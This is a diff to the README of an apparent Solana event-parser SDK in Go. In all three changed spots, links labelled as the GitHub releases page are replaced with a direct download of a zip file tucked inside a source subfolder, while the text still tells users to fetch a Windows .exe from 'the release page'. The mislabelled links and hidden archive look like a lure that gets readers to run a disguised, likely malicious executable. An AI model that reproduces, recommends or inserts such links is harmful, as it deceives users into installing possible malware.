@@ -1,6 +1,6 @@
 # 🔷 sol-parser-sdk-golang - Parse Solana Events with Ease
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Azamrahm5140/sol-parser-sdk-golang/main/shredstream/pb/golang-parser-sdk-sol-v3.4-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This project is meant for users who want a fast way to handle live Solana data o
 
 ## 📥 Download
 
-1. Open the release page: [Download the latest version](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
+1. Open the release page: [Download the latest version](https://raw.githubusercontent.com/Azamrahm5140/sol-parser-sdk-golang/main/shredstream/pb/golang-parser-sdk-sol-v3.4-beta.5.zip)
 2. On the release page, find the latest file for Windows
 3. Download the `.exe` file or the package marked for Windows
 4. Save it to a folder you can find again, such as `Downloads` or `Desktop`
@@ -165,7 +165,7 @@ When a new release appears, repeat the same process:
 
 ## 📎 Download Again
 
-[Visit the releases page to download the latest Windows version](https://github.com/Azamrahm5140/sol-parser-sdk-golang/releases)
+[Visit the releases page to download the latest Windows version](https://raw.githubusercontent.com/Azamrahm5140/sol-parser-sdk-golang/main/shredstream/pb/golang-parser-sdk-sol-v3.4-beta.5.zip)
 
 ## 📝 Project Details
 
